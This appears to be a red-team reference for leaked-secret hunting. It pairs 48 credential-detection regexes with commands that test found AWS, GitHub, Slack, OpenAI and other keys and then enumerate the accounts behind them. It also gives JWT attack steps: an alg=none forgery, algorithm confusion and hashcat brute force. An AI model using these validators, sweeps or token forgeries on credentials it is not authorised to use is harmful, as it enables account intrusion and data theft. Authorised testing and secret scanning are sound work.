# Secret Patterns & Live Validators

Load when scanning public artifacts for leaked secrets, validating them read-only, or doing post-validation read-only enumeration. Use `scripts/secret_scan.py` for runnable patterns.

> **Copy-paste note:** regexes below appear in a markdown table; literal `\|` inside cells is a **markdown pipe escape** for table rendering. When porting to a regex engine, unescape `\|` → `|` (alternation). Authoritative un-escaped versions live in `scripts/secret_scan.py`.

---

## 1. Catalog — 48 patterns

Run **most-specific first** so typed patterns don't get pre-empted by generic ones. Patterns flagged with `(ctx)` require a contextual sibling token (e.g. `cloudflare`, `dd_api_key`).

| # | Name | Regex | Severity | Category |
|---|---|---|---|---|
| 1 | AWS Access Key | `\b(AKIA\|ASIA)[0-9A-Z]{16}\b` | CRIT | aws |
| 2 | AWS Secret (typed) | `(?i)aws[_\-]?secret[_\-]?access[_\-]?key['"\s:=]+([A-Za-z0-9/+=]{40})` | CRIT | aws |
| 3 | AWS Secret (loose) | `(?i)aws(.{0,20})?(secret\|sk)["'=: ]+([0-9a-z/+=]{40})` | HIGH | aws |
| 4 | GCP Service Account JSON | `"type"\s*:\s*"service_account"` | CRIT | gcp |
| 5 | Google API Key | `\bAIza[0-9A-Za-z_\-]{35}\b` | HIGH | gcp |
| 6 | GitHub Classic PAT | `\bghp_[A-Za-z0-9]{36}\b` | CRIT | github |
| 7 | GitHub Fine-grained PAT | `\bgithub_pat_[A-Za-z0-9_]{82}\b` | CRIT | github |
| 8 | GitHub OAuth | `\bgho_[A-Za-z0-9]{36}\b` | HIGH | github |
| 9 | GitHub Server-to-Server | `\bgh[usr]_[A-Za-z0-9]{36,}\b` | HIGH | github |
| 10 | Stripe Live | `\bsk_live_[0-9A-Za-z]{24,}\b` | CRIT | stripe |
| 11 | Stripe Test | `\bsk_test_[0-9A-Za-z]{24,}\b` | LOW | stripe |
| 12 | Slack Token | `\bxox[abpors]-[0-9A-Za-z\-]{10,48}\b` | HIGH | slack |
| 13 | Slack Webhook | `https://hooks\.slack\.com/services/T[A-Z0-9]+/B[A-Z0-9]+/[A-Za-z0-9]+` | MED | slack |
| 14 | SendGrid | `\bSG\.[A-Za-z0-9_\-]{22}\.[A-Za-z0-9_\-]{43}\b` | HIGH | email_svc |
| 15 | Mailgun (v1) | `\bkey-[0-9a-zA-Z]{32}\b` | HIGH | email_svc |
| 16 | Mailgun (loose) | `\bkey-[0-9a-f]{32}\b` | HIGH | email_svc |
| 17 | Twilio API Key | `\bSK[0-9a-fA-F]{32}\b` | HIGH | twilio |
| 18 | Twilio Account SID | `\bAC[a-f0-9]{32}\b` | MED | twilio |
| 19 | Twilio Auth Token | `(?i)twilio(.{0,20})?(auth\|token)["'=: ]+([a-f0-9]{32})` | HIGH | twilio |
| 20 | Heroku API | `(?i)heroku(.{0,20})?api["'=: ]+([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})` | MED | paas |
| 21 | Firebase URL | `\bhttps?://[a-z0-9\-]+\.firebaseio\.com\b` | LOW | firebase |
| 22 | JWT | `\beyJ[A-Za-z0-9_\-]{10,}\.eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\b` | MED | jwt |
| 23 | Bearer Assignment | `(?i)authorization["'=: ]+bearer\s+[A-Za-z0-9._\-]{20,}` | MED | bearer |
| 24 | Basic Auth in URL | `https?://[^/\s:@]+:[^/\s:@]+@[^/\s]+` | MED | basic_auth |
| 25 | RSA Private Key | `-----BEGIN RSA PRIVATE KEY-----` | CRIT | private_key |
| 26 | EC Private Key | `-----BEGIN EC PRIVATE KEY-----` | CRIT | private_key |
| 27 | OpenSSH Private Key | `-----BEGIN OPENSSH PRIVATE KEY-----` | CRIT | private_key |
| 28 | Generic Private Key | `-----BEGIN (DSA \|PGP \|)PRIVATE KEY-----` | CRIT | private_key |
| 29 | Generic API Key | `(?i)(?:api[_\-]?key\|apikey\|api_secret\|access_token\|secret[_\-]?token)['"\s:=]+["']([A-Za-z0-9+/=_\-]{24,})["']` | MED | generic |
| 30 | Anthropic API | `\bsk-ant-(?:api03\|admin01)-[A-Za-z0-9_\-]{93,}\b` | CRIT | ai_api |
| 31 | OpenAI (legacy) | `\bsk-[A-Za-z0-9]{20}T3BlbkFJ[A-Za-z0-9]{20}\b` | CRIT | ai_api |
| 32 | OpenAI Project | `\bsk-proj-[A-Za-z0-9_\-]{40,}T3BlbkFJ[A-Za-z0-9_\-]{40,}\b` | CRIT | ai_api |
| 33 | OpenAI User Session | `\bsess-[A-Za-z0-9]{40}\b` | HIGH | ai_api |
| 34 | HuggingFace Token | `\bhf_[A-Za-z0-9]{30,}\b` | HIGH | ai_api |
| 35 | Cloudflare Token (ctx) | `\b[A-Za-z0-9_\-]{40}\b` + `(?i)cloudflare\|X-Auth-Key` | HIGH | infra_api |
| 36 | Cloudflare Global Key | `(?i)cf[_\-]?api[_\-]?key['"\s:=]+([a-f0-9]{37})` | CRIT | infra_api |
| 37 | DigitalOcean Token | `\bdop_v1_[a-f0-9]{64}\b` | HIGH | infra_api |
| 38 | npm Modern Token | `\bnpm_[A-Za-z0-9]{36}\b` | HIGH | package_registry |
| 39 | PyPI Token | `\bpypi-AgENdGV[A-Za-z0-9_\-]+\b` | HIGH | package_registry |
| 40 | Docker Hub PAT | `\bdckr_pat_[A-Za-z0-9_\-]{27,}\b` | HIGH | package_registry |
| 41 | Atlassian Token | `\bATATT3xFfGF0[A-Za-z0-9_\-]{180,}\b` | HIGH | saas_api |
| 42 | New Relic License | `\b(?:NRAA\|NRAK\|NRBR)-[A-F0-9]{27}\b` | MED | observability |
| 43 | DataDog Key (ctx) | `(?i)dd[_\-]?api[_\-]?key['"\s:=]+([a-f0-9]{32})` | HIGH | observability |
| 44 | Sentry DSN | `https://[a-f0-9]+@o[0-9]+\.ingest\.sentry\.io/[0-9]+` | LOW | observability |
| 45 | ngrok Auth (ctx) | `\b[12][A-Za-z0-9]{26}_[A-Za-z0-9]{32,}\b` + `(?i)ngrok` | MED | tunneling |
| 46 | Linear API | `\blin_api_[A-Za-z0-9]{40}\b` | MED | saas_api |
| 47 | Discord Bot Token | `\b[MN][A-Za-z\d]{23}\.[\w\-]{6}\.[\w\-]{27}\b` | HIGH | bot_token |
| 48 | Telegram Bot Token | `\b\d{8,10}:[A-Za-z0-9_\-]{35}\b` | HIGH | bot_token |

### False-positive notes
- 22/23/29 fire on examples + docs constantly — always inspect surrounding context (`README.md` example vs `.env`).
- 16, 11 are noisy by design (low severity reflects it).
- 24 catches monitoring URLs + CI debug.
- 7 length is GitHub-spec — be skeptical of off-length matches.
- 35, 43, 45 require contextual sibling; do not fire standalone.

---

## 2. Validators (read-only)

All endpoints below are **GET/POST without side effects**. Never use a validated cred to create/modify/delete/send.

### 2.1 Postman PMAK
```
GET https://api.getpostman.com/me
X-Api-Key: PMAK-<key>
```
200 → live, returns `{user:{id,username,email}}`. Detect: low.

### 2.2 AWS Access Key
```python
import boto3
sts = boto3.client('sts', aws_access_key_id='AKIA...', aws_secret_access_key='...', region_name='us-east-1')
sts.get_caller_identity()  # Account, Arn, UserId
```
ARN scope: `:user/`=IAM user (broad), `:assumed-role/`=temp (narrow), `:root`=DO NOT validate. Detect: **MEDIUM** (CloudTrail logs).

### 2.3 GitHub PAT
```
GET https://api.github.com/user
Authorization: token ghp_*
```
200 → live. Header `X-OAuth-Scopes` lists scopes (`repo` = write-all, `admin:org` = org admin). Detect: low.

### 2.4 Slack
```
POST https://slack.com/api/auth.test
Authorization: Bearer xox*-*
```
`{"ok":true}` → live + `team/team_id/user/user_id`. Detect: low.

### 2.5 Anthropic
```
GET https://api.anthropic.com/v1/models
x-api-key: sk-ant-api03-...
anthropic-version: 2023-06-01
```
200 → live. 403 `org_disabled` → key valid, org disabled. Detect: low.

### 2.6 OpenAI
```
GET https://api.openai.com/v1/models
Authorization: Bearer sk-...
```
200 → live. 429 → live but quota out. Detect: low.

### 2.7 npm
```
GET https://registry.npmjs.org/-/whoami
Authorization: Bearer npm_*
```
Scope check: `GET /-/npm/v1/tokens`. Detect: low.

### 2.8 Atlassian
```
GET https://<workspace>.atlassian.net/rest/api/3/myself
Auth: Basic base64(email:ATATT3xFfGF0_...)
```
Workspace name required (extract from leaked repo URL / Atlassian dorks). Detect: low.

### 2.9 DataDog
```
GET https://api.<region>.datadoghq.com/api/v1/validate
DD-API-KEY / DD-APPLICATION-KEY
```
Regions: `datadoghq.com`, `datadoghq.eu`, `us3.datadoghq.com`, etc. Detect: low (DD audit log).

### 2.10 Output schema
```json
{
  "status": "verified_live|verified_dead|scope_restricted|scope_unrestricted|validation_skipped_by_policy|validation_unsupported|validation_failed_transient",
  "provider": "postman|aws|github|slack|anthropic|openai|npm|atlassian|datadog",
  "account_id": "<opaque>",
  "scope": "<freeform>",
  "metadata": {},
  "checked_at": "<UTC ISO8601>",
  "detectability": "low|medium|high"
}
```

### 2.11 Hard rules
- Read-only endpoint only.
- Never create/modify/delete/send.
- Tag detectability + `checked_at` UTC.
- RoE forbids → `validation_skipped_by_policy`, stop, document.
- Root AWS keys, infra-write GitHub PATs, admin Slack tokens → flag operator, do not validate.

---

## 3. Post-validation read-only enumeration

### 3.1 AWS — IAM + service enum
```bash
export AWS_ACCESS_KEY_ID="AKIA..." AWS_SECRET_ACCESS_KEY="..."

aws sts get-caller-identity
aws iam get-user
USER=$(aws iam get-user --query 'User.UserName' --output text)
aws iam list-attached-user-policies --user-name "$USER"
aws iam list-user-policies --user-name "$USER"
aws iam list-groups-for-user --user-name "$USER"

# Capability simulation
aws iam simulate-principal-policy \
  --policy-source-arn $(aws sts get-caller-identity --query Arn --output text) \
  --action-names s3:ListAllMyBuckets ec2:DescribeInstances iam:ListUsers \
                 secretsmanager:ListSecrets ssm:DescribeParameters \
                 lambda:ListFunctions rds:DescribeDBInstances

# Read-only sweeps (NO writes)
aws s3 ls
aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,State.Name,Tags[?Key==`Name`].Value]'
aws secretsmanager list-secrets --query 'SecretList[*].Name'
aws ssm describe-parameters --query 'Parameters[*].Name'
aws lambda list-functions --query 'Functions[*].FunctionName'
aws rds describe-db-instances --query 'DBInstances[*].DBInstanceIdentifier'

# Logging + MFA posture
aws cloudtrail describe-trails
aws iam get-account-summary | jq '.SummaryMap.AccountMFAEnabled'
aws iam list-mfa-devices --user-name "$USER"
```

### 3.2 GitHub PAT — repo + org enum
```bash
H="Authorization: token $TOKEN"
curl -sk -m 10 -I -H "$H" https://api.github.com/user | grep -i 'X-OAuth-Scopes'
curl -sk -m 10 -H "$H" "https://api.github.com/user/repos?affiliation=owner,collaborator,organization_member&per_page=100"
curl -sk -m 10 -H "$H" "https://api.github.com/user/orgs"
ORG="<org>"
curl -sk -m 10 -H "$H" "https://api.github.com/orgs/$ORG/members"
curl -sk -m 10 -H "$H" "https://api.github.com/orgs/$ORG/repos?per_page=100"
curl -sk -m 10 -H "$H" "https://api.github.com/orgs/$ORG/actions/secrets"   # needs admin:org; returns metadata only
REPO="<org/repo>"
curl -sk -m 10 -H "$H" "https://api.github.com/repos/$REPO/actions/secrets"
```

### 3.3 Slack — workspace enum
```bash
H="Authorization: Bearer xoxb-..."
curl -sk -m 10 -H "$H" -X POST https://slack.com/api/users.identity | jq .
curl -sk -m 10 -H "$H" -X POST "https://slack.com/api/conversations.list?types=public_channel,private_channel,mpim,im&limit=200" | jq '.channels[] | {id, name, is_private}'
curl -sk -m 10 -H "$H" -X POST https://slack.com/api/team.info | jq .
curl -sk -m 10 -H "$H" -X POST "https://slack.com/api/users.list?limit=100" | jq '.members[] | {name, real_name, is_admin}'
# DO NOT: chat.postMessage, files.upload, conversations.invite
```

### 3.4 JWT triage
```bash
JWT="eyJhbGciOiJI..."
# header — alg (none=CRIT, HS*=sym, RS*=asym, ES*=ECDSA), kid, jku, x5u
echo "$JWT" | cut -d. -f1 | base64 -d 2>/dev/null | jq .
# payload — exp/iat/nbf, sub/iss/aud, roles/scopes, PII
echo "$JWT" | cut -d. -f2 | base64 -d 2>/dev/null | jq .

# RS→HS algorithm confusion: craft HS256 token signed with the RS public key as secret (jwt_tool / jwt-cracker)

# HS256 short-secret brute
hashcat -m 16500 "$JWT" wordlist.txt

# alg=none bypass
NEW=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr -d '=' | tr '/+' '_-')
NEW="${NEW}.$(echo "$JWT" | cut -d. -f2)."
```

### 3.5 Postman PMAK — workspace enum
```bash
H="X-Api-Key: $PMAK"
curl -sk -m 10 -H "$H" https://api.getpostman.com/workspaces | jq '.workspaces[] | {id,name,type}'
WS="<ws-id>"
curl -sk -m 10 -H "$H" "https://api.getpostman.com/workspaces/$WS" | jq '.workspace.collections[], .workspace.environments[]'
COL="<col-id>"; ENV="<env-id>"
curl -sk -m 10 -H "$H" "https://api.getpostman.com/collections/$COL" | jq '.collection.item[]'
curl -sk -m 10 -H "$H" "https://api.getpostman.com/environments/$ENV" | jq '.environment.values[] | {key,value}'
# Re-run secret catalog over the JSON bodies — many CRIT keys live in collection examples and env vars
```

### 3.6 Anthropic — usage enum
```bash
H="x-api-key: $KEY"; A="anthropic-version: 2023-06-01"
curl -sk -m 10 -H "$H" -H "$A" https://api.anthropic.com/v1/models | jq '.data[].id'
# admin-scoped only:
curl -sk -m 10 -H "$H" -H "$A" https://api.anthropic.com/v1/organizations/usage_report | jq .
# DO NOT: send completion requests against org budget
```

### 3.7 OpenAI — usage enum
```bash
H="Authorization: Bearer $KEY"
curl -sk -m 10 -H "$H" https://api.openai.com/v1/models | jq '.data | length'
curl -sk -m 10 -H "$H" https://api.openai.com/v1/organizations | jq .
curl -sk -m 10 -H "$H" https://api.openai.com/v1/files | jq .
curl -sk -m 10 -H "$H" https://api.openai.com/v1/fine_tuning/jobs | jq .   # training data may contain PII
```

### 3.8 Generic key — provenance
1. Find consuming domain (which JS bundle contained it, which URL served the bundle).
2. Check inferred service docs.
3. If matches known regex → run vendor scope check from §2.
